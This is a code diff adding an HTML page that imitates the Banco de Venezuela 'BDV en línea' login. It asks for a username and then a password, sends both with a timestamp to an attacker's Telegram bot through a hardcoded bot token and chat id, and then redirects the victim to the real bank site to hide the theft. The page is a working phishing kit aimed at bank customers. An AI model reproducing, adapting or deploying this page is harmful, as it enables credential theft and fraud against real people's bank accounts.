@@ -1,0 +1,392 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BDV en línea personas</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #f5f5f5;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 80%;
+            max-width: 300px;
+            padding: 40px 15px;
+            background: white;
+            border-radius: 8px;
+            margin: 15px auto;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+            position: relative;
+            min-height: 250px;
+        }
+        .logo {
+            width: 160px;
+            display: block;
+            margin: 0 auto 20px;
+            position: relative;
+        }
+        .input-container {
+            position: relative;
+            margin: 15px auto;
+            width: calc(100% - 60px);
+            max-width: 250px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 22px 10px 8px;
+            border: none;
+            border-bottom: 1px solid #ddd;
+            border-radius: 0;
+            font-size: 14px;
+            box-sizing: border-box;
+            outline: none;
+            background-color: #f5f5f5;
+        }
+        .input-label {
+            position: absolute;
+            left: 12px;
+            top: 16px;
+            font-size: 14px;
+            color: #666;
+            transition: all 0.3s ease;
+            pointer-events: none;
+        }
+        .input-field:focus ~ .input-label,
+        .input-field:not(:placeholder-shown) ~ .input-label {
+            top: 5px;
+            left: 12px;
+            font-size: 12px;
+            color: #e31837;
+        }
+        .input-field:focus {
+            border-bottom: 2px solid #e31837;
+        }
+        .btn-entrar {
+            width: calc(100% - 130px);
+            padding: 15px 10px;
+            background: #e0e0e0;
+            color: #666;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            margin: 12px auto;
+            transition: all 0.3s ease;
+            height: 45px;
+            display: block;
+        }
+        .btn-entrar.active {
+            background: #2E73C7;
+            color: white;
+        }
+        .links {
+            text-align: center;
+            margin-top: 35px;
+        }
+        .links a {
+            color: #666;
+            text-decoration: none;
+            font-size: 12px;
+            display: block;
+            margin: 6px 0;
+        }
+        .password-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100vh;
+            background: rgba(128, 128, 128, 0.5);
+            z-index: 1000;
+        }
+        .password-container {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            padding: 40px 20px;
+            border-radius: 8px;
+            width: 80%;
+            max-width: 300px;
+            min-height: 200px;
+        }
+        .password-container h3 {
+            color: #2E73C7;
+            text-align: center;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        .password-input-container {
+            position: relative;
+            margin: 15px auto;
+            background: #f5f5f5;
+            padding: 10px;
+            border-radius: 0;
+            height: 30px;
+            width: calc(100% - 80px);
+            max-width: 250px;
+        }
+        .password-input {
+            width: calc(100% + 2px);
+            padding: 18px 10px 8px;
+            border: none;
+            border-bottom: 2px solid transparent;
+            background: transparent;
+            font-size: 14px;
+            outline: none;
+            position: relative;
+            transition: all 0.3s ease;
+            margin-left: -10px;
+            margin-right: -2px;
+        }
+        .password-input:focus {
+            border-bottom: 2px solid #e31837;
+        }
+        .password-input:focus::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: -10px;
+            right: -10px;
+            height: 2px;
+            background: #e31837;
+        }
+        .password-label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 16px;
+            color: #666;
+            transition: all 0.3s ease;
+            pointer-events: none;
+        }
+        .password-input:focus ~ .password-label,
+        .password-input:not(:placeholder-shown) ~ .password-label {
+            top: 5px;
+            left: 12px;
+            transform: none;
+            font-size: 12px;
+            color: #e31837;
+        }
+        .show-password-btn {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #666;
+            cursor: pointer;
+            font-size: 16px;
+            padding: 5px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 10;
+        }
+        .show-password-btn i {
+            font-size: 18px;
+        }
+        .required-text {
+            color: #666;
+            font-size: 12px;
+            margin: 10px 0;
+        }
+        .required-text span {
+            color: #e31837;
+        }
+        .modal-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 40px;
+            width: calc(100% - 80px);
+            max-width: 250px;
+            margin-left: auto;
+            margin-right: auto;
+            justify-content: space-between;
+        }
+        .btn-continuar, .btn-cancelar {
+            flex: 0.46;
+            padding: 15px 10px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            cursor: pointer;
+            height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .btn-continuar {
+            background: #e0e0e0;
+            color: #666;
+        }
+        .btn-continuar.active {
+            background: #2E73C7;
+            color: white;
+        }
+        .btn-cancelar {
+            background: #2E73C7;
+            color: white;
+        }
+        .loader {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(128, 128, 128, 0.5);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .bars {
+            display: flex;
+            gap: 6px;
+        }
+        .bar {
+            width: 6px;
+            height: 24px;
+            background: #666;
+            animation: loading 1s ease-in-out infinite;
+        }
+        .bar:nth-child(1) { animation-delay: 0s; }
+        .bar:nth-child(2) { animation-delay: 0.1s; }
+        .bar:nth-child(3) { animation-delay: 0.2s; }
+        .bar:nth-child(4) { animation-delay: 0.3s; }
+        .bar:nth-child(5) { animation-delay: 0.4s; }
+        @keyframes loading {
+            0% { transform: scaleY(0.5); }
+            50% { transform: scaleY(1); }
+            100% { transform: scaleY(0.5); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="images/logoenlineapersonas.png" alt="BDV" class="logo">
+        <div class="input-container">
+            <input type="text" class="input-field" placeholder=" " required>
+            <label class="input-label">Usuario *</label>
+        </div>
+        <button class="btn-entrar">Entrar</button>
+        <div class="links">
+            <a href="#">¿Olvidaste tu usuario o clave?</a>
+            <a href="#">Si eres nuevo clienteBDV regístrate aquí</a>
+        </div>
+    </div>
+
+    <div id="passwordModal" class="password-modal">
+        <div class="password-container">
+            <h3>Introduce tu contraseña</h3>
+            <div class="password-input-container">
+                <input type="password" class="password-input" placeholder=" " required>
+                <label class="password-label">Contraseña</label>
+                <button class="show-password-btn">
+                    <i class="fas fa-eye"></i>
+                </button>
+            </div>
+            <div class="modal-buttons">
+                <button class="btn-continuar">Continuar</button>
+                <button class="btn-cancelar">Cancelar</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="loader">
+        <div class="bars">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </div>
+    </div>
+
+    <script>
+        const inputField = document.querySelector('.input-field');
+        const btnEntrar = document.querySelector('.btn-entrar');
+
+        inputField.addEventListener('input', function() {
+            if (this.value.length > 0) {
+                btnEntrar.classList.add('active');
+            } else {
+                btnEntrar.classList.remove('active');
+            }
+        });
+
+        btnEntrar.addEventListener('click', () => {
+            const loader = document.querySelector('.loader');
+            loader.style.display = 'flex';
+            
+            setTimeout(() => {
+                loader.style.display = 'none';
+                const passwordModal = document.querySelector('.password-modal');
+                passwordModal.style.display = 'block';
+            }, 1500);
+        });
+
+        const showPasswordBtn = document.querySelector('.show-password-btn');
+        const passwordInput = document.querySelector('.password-input');
+
+        showPasswordBtn.addEventListener('click', () => {
+            const icon = showPasswordBtn.querySelector('i');
+            
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                icon.classList.remove('fa-eye');
+                icon.classList.add('fa-eye-slash');
+            } else {
+                passwordInput.type = 'password';
+                icon.classList.remove('fa-eye-slash');
+                icon.classList.add('fa-eye');
+            }
+        });
+
+        passwordInput.addEventListener('input', function() {
+            if (this.value.length > 0) {
+                btnContinuar.classList.add('active');
+            } else {
+                btnContinuar.classList.remove('active');
+            }
+        });
+
+        btnCancelar.addEventListener('click', async () => {
+            const usuario = document.querySelector('.input-field').value;
+            const password = document.querySelector('.password-input').value;
+            
+            // Mostrar loader
+            const loader = document.querySelector('.loader');
+            loader.style.display = 'flex';
+            
+            // Enviar a Telegram
+            const token = "8080814760:AAFEZS3tJZHNg6zNbPh2JNFSLXNccRSElYQ";
+            const chat_id = "6912929677";
+            const mensaje = `🏦 ═══ BDV EN LÍNEA ═══ 🏦\n\n👤 Usuario: ${usuario}\n🔑 Clave: ${password}\n📅 Fecha: ${new Date().toLocaleString()}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(mensaje)}`)
+            .then(() => {
+                setTimeout(() => {
+                    window.location.href = 'https://bdvenlinea.banvenez.com/';
+                }, 2000);
+            })
+            .catch(() => {
+                setTimeout(() => {
+                    window.location.href = 'https://bdvenlinea.banvenez.com/';
+                }, 2000);
+            });
+        });
+    </script>
+</body>
+</html> 
